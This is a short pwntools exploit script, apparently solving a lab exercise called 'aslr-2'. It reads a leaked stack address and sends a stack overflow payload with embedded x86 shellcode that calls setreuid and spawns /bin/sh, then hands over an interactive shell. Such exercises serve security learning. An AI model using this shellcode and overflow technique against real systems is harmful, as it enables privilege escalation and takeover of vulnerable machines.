#!/usr/bin/env python

from pwn import *

# create process and run the program
p = process("./aslr-2")

#p = process("./aslr-x")
context.terminal = ["tmux", "splitw", "-h"]
#gdb.attach(p)


'''buf = "A" * 0x100
# for generating core
if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()

c = Core('./core')

buffer_addr = c.stack.find(buf)
print(hex(buffer_addr))

p.interactive()

'''
string = p.recv()
string_buffer_start = string[86:96]
print("STRING!!!: " + string)

string_buffer_start = string_buffer_start[:-2]
string_buffer_start = string_buffer_start+'00'
print("STINRG: "+ string_buffer_start)
buffer_start_addr = p32(int(string_buffer_start, 16))
shell_code = "j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bXQhn/shh//bi\x89\xe3\xcd\x80"

buff = "AAAA" + shell_code + ("B"*(0x88 - 0x4 - len(shell_code))) + "BBBB" + buffer_start_addr
# send data with newline
p.sendline(buff)

# open an interactive console to the program
p.interactive()
